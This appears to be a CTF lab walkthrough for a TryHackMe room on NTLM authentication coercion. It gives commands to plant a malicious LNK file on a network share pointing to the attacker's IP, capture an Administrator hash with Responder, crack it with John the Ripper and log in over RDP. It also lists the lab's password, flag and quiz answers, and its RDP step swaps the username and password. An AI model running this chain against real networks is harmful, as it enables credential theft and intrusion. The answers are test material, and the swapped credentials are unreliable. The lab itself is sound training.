# Day_23 [Coerced-Authentication] Relay All the Way

+ Deployable Machine: Yes

Description: McSkidy is unable to authenticate to her server! It seems that McGreedy has struck again and changed the password! We know it’s him since Log McBlue confirmed in the logs that there were authentication attempts from his laptop. Online brute-force attacks don’t seem to be working, so it’s time to get creative. We know that the server has a network file share, so if we can trick McGreedy, perhaps we can get him to disclose the new password to us. Let’s get to work!

> IP: [10.10.69.124]

## LEARNING OBJECTIVES

1. The basics of network file shares
2. Understanding NTLM authentication
3. How NTLM authentication coercion attacks work
4. How Responder works for authentication coercion attacks
5. Forcing authentication coercion using lnk files

## OVERVIEW

## STEPS

1. Deploy Machine
2. Deploy Split Screen
3. COERCING CONNECTEE
   1. Navigate to ntlm_theft
      1. > cd /root/Rooms/AoC2023/Day23/ntlm_theft/
   2. Create LNK file
      1. > python3 ntlm_theft.py -g lnk -s [MY_IP_ADDR] -f stealthy
         1. This created a LNK file in the stealthy directory
4. McGREEDY MUCH
   1. Lets add the LNK file to our network share
      1. > cd stealthy
      2. > smbclient //10.10.69.124/ElfShare/ -U guest%
      3. > put stealthy.lnk
      4. > dir
   2. Now lets run RESPONDER to listen for incoming auth attempts
      1. > responder -I ens5
         1. Now we wait for a response

            ```text
               [SMB] NTLMv2-SSP Client   : ::ffff:10.10.69.124
               [SMB] NTLMv2-SSP Username : ELFHQSERVER\Administrator
               [SMB] NTLMv2-SSP Hash     : Administrator::ELFHQSERVER:b36f1713c35d0255:8241BF8EB1BF23C81325DE887B008074:010100000000000000EE2F265238DA019EEB2BF4D524A5AF00000000020008004E004C005800510001001E00570049004E002D00590055004A0049004A004E004F00340050004800560004003400570049004E002D00590055004A0049004A004E004F0034005000480056002E004E004C00580051002E004C004F00430041004C00030014004E004C00580051002E004C004F00430041004C00050014004E004C00580051002E004C004F00430041004C000700080000EE2F265238DA010600040002000000080030003000000000000000000000000030000097798B88A3BE2AE136163A105F5C896550C601F345601C1DB97E9AF9B26DB5D60A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E003200340033002E00320034000000000000000000
            ```

            1. Now we have the hash, lets try and crack it

   3. Lets grab the greedykeys.txt
      1. > get greedykeys.txt
5. CRACK HASH
   1. First create a hash.txt file
   2. JOHN THE RIPPER
      1. > john --wordlist=greedykeys.txt hash.txt
         1. RESPONSE: `GreedyGrabber1@  (Administrator)`
6. RDP
   1. Now that we have the admin credentials lets RDP into the Admin Account
      1. RDP
         1. IP: 10.10.69.124
         2. UN: GreedyGrabber1@
         3. PW: Administrator
            1. Navigate to Desktop -> flag.txt
               1. FLAG: `THM{Greedy.Greedy.McNot.So.Great.Stealy}`

## QUESTIONS

1. What is the name of the AD authentication protocol that makes use of tickets?
   1. `Kerberos`
2. What is the name of the AD authentication protocol that makes use of the NTLM hash?
   1. `NetNTLM`
3. What is the name of the tool that can intercept these authentication challenges?
   1. `Responder`
4. What is the password that McGreedy set for the Administrator account?
   1. `GreedyGrabber1@`
5. What is the value of the flag that is placed on the Administrator’s desktop?
   1. `THM{Greedy.Greedy.McNot.So.Great.Stealy}`
